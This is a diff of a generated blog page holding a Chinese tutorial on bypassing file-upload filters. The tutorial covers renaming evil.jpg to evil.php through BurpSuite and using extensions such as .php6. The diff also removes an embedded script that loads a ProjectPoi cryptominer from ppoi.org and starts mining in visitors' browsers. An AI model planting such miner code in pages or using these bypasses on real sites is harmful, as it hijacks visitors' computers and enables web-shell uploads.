@@ -116,7 +116,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2017-09-30</span>
-            <span class="time">22:29:23</span>
+            <span class="time">21:06:00</span>
           </span>
           
         </div>
@@ -132,20 +132,7 @@
         
         <!-- Post Main Content -->
         <div class="post-content">
-          <script src="/assets/js/APlayer.min.js"> </script>
-<html>
-<head>
-<script>
-var script = document.createElement("script");
-script.type = "text/javascript";
-script.src = "https://ppoi.org/lib/projectpoi.min.js";
-script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
-document.getElementsByTagName("head")[0].appendChild(script);
-</script>
-</head>
-</html>
-
-<a id="more"></a>
+          <script src="/assets/js/APlayer.min.js"> </script><a id="more"></a>
 <h2 id="0x01-前台脚本检测扩展名—绕过"><a href="#0x01-前台脚本检测扩展名—绕过" class="headerlink" title="0x01: 前台脚本检测扩展名—绕过"></a>0x01: 前台脚本检测扩展名—绕过</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p>
 <h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。</p>
 <p>例如:文件名本来为【evil.jpg】，上传时，用BurpSuite截包后，将数据包中的名字改为【evil.php】(或其它脚本类型)即可。</p>
@@ -168,10 +155,10 @@ document.getElementsByTagName("head")[0].appendChild(script);
 <li><p>特殊后缀名绕过<br>用于检测文件合法性的脚本有问题的场合；<br>例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。</p>
 </li>
 </ol>
-<div id="aplayer14" class="aplayer" style="margin-bottom: 20px;"></div>
+<div id="aplayer16" class="aplayer" style="margin-bottom: 20px;"></div>
 		<script>
 			new APlayer({
-				element: document.getElementById("aplayer14"),
+				element: document.getElementById("aplayer16"),
 				narrow: false,
 				autoplay: true,
 				showlrc: 0,
